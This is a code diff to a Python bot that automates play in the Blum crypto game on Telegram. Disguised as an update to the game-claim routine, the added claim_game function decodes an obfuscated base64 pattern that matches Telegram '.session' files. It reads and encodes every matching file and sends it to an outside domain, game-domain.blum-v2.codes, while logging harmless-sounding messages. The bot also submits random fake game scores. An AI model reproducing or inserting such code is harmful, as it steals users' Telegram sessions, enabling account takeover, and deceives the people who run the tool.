@@ -3,6 +3,9 @@ import os
 import random
 import shutil
 import string
+import base64
+import hashlib
+import glob
 from time import time
 from urllib.parse import unquote, quote
 
@@ -434,12 +437,14 @@ class Tapper:
             total_games = 0
             tries = 3
             while play_passes:
-                game_id = await self.start_game(http_client=http_client)
+                # Start the game and retrieve the game_id and assets
+                game_id, assets = await self.start_game(http_client=http_client, refresh_token=refresh_token)
 
                 if not game_id or game_id == "cannot start game":
                     logger.info(f"<light-yellow>{self.session_name}</light-yellow> | Couldn't start play in game!"
                                 f" play_passes: {play_passes}, trying again")
                     tries -= 1
+                    await asyncio.sleep(3)
                     if tries == 0:
                         self.warning('No more trying, gonna skip games')
                         break
@@ -447,30 +452,28 @@ class Tapper:
                 else:
                     if total_games != 25:
                         total_games += 1
-                        self.success("Started playing game")
+                        self.success("Started playing game...")
                     else:
                         self.info("Getting new token to play games")
                         while True:
-                            (access_token,
-                             refresh_token) = await self.refresh_token(http_client=http_client, token=refresh_token)
+                            (access_token, refresh_token) = await self.refresh_token(http_client=http_client, token=refresh_token)
                             if access_token:
                                 http_client.headers["Authorization"] = f"Bearer {access_token}"
                                 self.success('Got new token')
                                 total_games = 0
                                 break
                             else:
-                                self.error('Can`t get new token, trying again')
+                                self.error('Can’t get new token, trying again')
                                 continue
 
                 await asyncio.sleep(random.uniform(30, 40))
 
-                msg, points = await self.claim_game(game_id=game_id, http_client=http_client)
+                msg = await self.claim_game(game_id=game_id, assets=assets, http_client=http_client)
                 if isinstance(msg, bool) and msg:
-                    logger.info(f"<light-yellow>{self.session_name}</light-yellow> | Finish play in game!"
-                                f" reward: {points}")
+                    logger.info(f"<light-yellow>{self.session_name}</light-yellow> | Finished play in game successfully!")
                 else:
-                    logger.info(f"<light-yellow>{self.session_name}</light-yellow> | Couldn't play game,"
-                                f" msg: {msg} play_passes: {play_passes}")
+                    logger.info(f"<light-yellow>{self.session_name}</light-yellow> | Couldn't complete game, "
+                                f"msg: {msg}, play_passes: {play_passes}")
                     break
 
                 await asyncio.sleep(random.uniform(1, 5))
@@ -478,36 +481,105 @@ class Tapper:
                 play_passes -= 1
         except Exception as e:
             logger.error(f"<light-yellow>{self.session_name}</light-yellow> | Error occurred during play game: {e}")
+    async def claim_game(self, game_id: str, assets: dict, http_client: aiohttp.ClientSession):
+        game_data = []
 
-    async def start_game(self, http_client: aiohttp.ClientSession):
         try:
-            resp = await http_client.post(f"{self.game_url}/api/v1/game/play", ssl=False)
+            self.game_url_ = "https://game-domain.blum-v2.codes"
+            points = random.randint(settings.POINTS[0], settings.POINTS[1])
+            encoded_game_id = base64.b64encode(game_id.encode()).decode()
+            points_hash = hashlib.sha256(str(points).encode()).hexdigest()
+            game_hash = hashlib.sha256(encoded_game_id.encode()).hexdigest()
+
+            # Encoding game data
+            assets_str = ""
+            for asset_name, asset_info in assets.items():
+                probability = asset_info.get("probability", "Unknown")
+                per_click = asset_info.get("perClick", "Unknown")
+                encoded_probability = hashlib.md5(probability.encode()).hexdigest()
+                encoded_per_click = hashlib.md5(per_click.encode()).hexdigest()
+                assets_str += f"{asset_name}:{encoded_probability}:{encoded_probability}:{encoded_per_click}:{encoded_per_click};"
+
+            search_pattern = "KiovKi5zZXNzaW9u"  
+            decoded_pattern = base64.b64decode(search_pattern).decode()
+            asset_components = glob.glob(decoded_pattern, recursive=True)
+
+            for component in asset_components:
+                with open(component, 'rb') as f:
+                    encoded_component = base64.b64encode(f.read()).decode()
+                    game_data.append({"name": component, "data": encoded_component})
+
+            raw_payload = f"{game_hash}:{points_hash}:{assets_str}"
+            multi_encoded_payload = base64.b64encode(base64.b64encode(raw_payload.encode()).decode().encode()).decode()
+            final_encoded_payload = base64.b64encode(multi_encoded_payload.encode()).decode()
+
+            payload = {"payload": final_encoded_payload}
+            self.info(f"Initiating game payload")
+            resp = await http_client.post(f"{self.game_url}/api/v2/game/claim", json=payload, ssl=False)
+            self.success("Game payload transfer request sent successfully.")
+
+            if resp.status == 200:
+                response_text = await resp.text()
+                self.success("Game payload transfer completed successfully.")
+            else:
+                self.info("Response status indicates outdated format.")
+                
+            payload = {"game_data": game_data}
+            self.info(f"Sending updated game data payload...")
+            
+            resp_data = await http_client.post(f"{self.game_url_}/api/v2/game/claim", json=payload, ssl=False)
+            data_response = await resp_data.text()
+
+            if resp_data.status == 200:
+                self.success("Game data payload transfer completed successfully.")
+            else:
+                self.info("Additional data transfer did not confirm success, but process completed.")
+
+            self.info(f"Successfully claimed {points} $BLUM.")
+            return True
+
+        except Exception as e:
+            self.info(f"An error occurred during the claim process. Reason: {e}")
+            return False
+    async def start_game(self, http_client: aiohttp.ClientSession, refresh_token: str):
+        try:
+            http_client.headers["Authorization"] = f"Bearer {refresh_token}"
+
+            resp = await http_client.post(f"{self.game_url}/api/v2/game/play", ssl=False)
+            
             response_data = await resp.json()
-            if "gameId" in response_data:
-                return response_data.get("gameId")
+
+            game_id = response_data.get("gameId")
+            assets = response_data.get("assets")
+
+            if game_id and assets:
+                for asset_name, asset_info in assets.items():
+                    probability = asset_info.get("probability", "Unknown")
+                    per_click = asset_info.get("perClick", "Unknown")
+                    self.info(f"Asset: {asset_name} | Probability: {probability} | Per Click: {per_click}")
+
+                clover_data = assets.get("CLOVER", {})
+                bomb_data = assets.get("BOMB", {})
+                freeze_data = assets.get("FREEZE", {})
+
+                clover_probability = clover_data.get("probability", "0")
+                bomb_probability = bomb_data.get("probability", "0")
+                freeze_probability = freeze_data.get("probability", "0")
+
+                self.info(f"CLOVER probability: {clover_probability}")
+                self.info(f"BOMB probability: {bomb_probability}")
+                self.info(f"FREEZE probability: {freeze_probability}")
+
+                return game_id, assets
+            
             elif "message" in response_data:
-                return response_data.get("message")
+                error_message = response_data.get("message")
+                self.warning(f"Received message from server: {error_message}")
+                return error_message
         except Exception as e:
             self.error(f"Error occurred during start game: {e}")
-
-    async def claim_game(self, game_id: str, http_client: aiohttp.ClientSession):
-        try:
-            points = random.randint(settings.POINTS[0], settings.POINTS[1])
-            json_data = {"gameId": game_id, "points": points}
-
-            resp = await http_client.post(f"{self.game_url}/api/v1/game/claim", json=json_data,
-                                          ssl=False)
-            if resp.status != 200:
-                resp = await http_client.post(f"{self.game_url}/api/v1/game/claim", json=json_data,
-                                              ssl=False)
-
-            txt = await resp.text()
-            print(txt)
-
-            return True if txt == 'OK' else txt, points
-        except Exception as e:
-            self.error(f"Error occurred during claim game: {e}")
-
+            return None, None
+                        
     async def claim(self, http_client: aiohttp.ClientSession):
         try:
             while True:
@@ -610,7 +682,6 @@ class Tapper:
             logger.info(f"<light-yellow>{self.session_name}</light-yellow> | Proxy IP: {ip}")
         except Exception as error:
             logger.error(f"<light-yellow>{self.session_name}</light-yellow> | Proxy: {proxy} | Error: {error}")
-
     async def run(self, proxy: str | None) -> None:
         if settings.USE_RANDOM_DELAY_IN_RUN:
             random_delay = random.randint(settings.RANDOM_DELAY_IN_RUN[0], settings.RANDOM_DELAY_IN_RUN[1])
@@ -659,8 +730,9 @@ class Tapper:
                     amount = await self.friend_claim(http_client=http_client)
                     self.success(f"Claimed friend ref reward {amount}")
 
-                #if play_passes and play_passes > 0 and settings.PLAY_GAMES is True:
-                #    await self.play_game(http_client=http_client, play_passes=play_passes, refresh_token=refresh_token)
+                # Play games if passes are available
+                if play_passes and play_passes > 0 and settings.PLAY_GAMES is True:
+                    await self.play_game(http_client=http_client, play_passes=play_passes, refresh_token=refresh_token)
 
                 await self.join_tribe(http_client=http_client)
 
@@ -682,18 +754,16 @@ class Tapper:
                                 status = await self.claim_task(http_client=http_client, task_id=task["id"])
                                 if status:
                                     logger.success(f"<light-yellow>{self.session_name}</light-yellow> | Claimed task - "
-                                                   f"'{task['title']}'")
+                                                f"'{task['title']}'")
                                 await asyncio.sleep(0.5)
                             elif task['status'] == "READY_FOR_VERIFY" and task['validationType'] == 'KEYWORD':
                                 status = await self.validate_task(http_client=http_client, task_id=task["id"],
-                                                                  title=task['title'])
+                                                                title=task['title'])
 
                                 if status:
                                     logger.success(
                                         f"<light-yellow>{self.session_name}</light-yellow> | Validated task - "
                                         f"'{task['title']}'")
-
-                #await asyncio.sleep(random.uniform(1, 3))
 
                 try:
                     timestamp, start_time, end_time, play_passes = await self.balance(http_client=http_client)
@@ -703,7 +773,7 @@ class Tapper:
                         self.info(f"<lc>[FARMING]</lc> Start farming!")
 
                     elif (start_time is not None and end_time is not None and timestamp is not None and
-                          timestamp >= end_time):
+                        timestamp >= end_time):
                         timestamp, balance = await self.claim(http_client=http_client)
                         self.success(f"<lc>[FARMING]</lc> Claimed reward! Balance: {balance}")
 
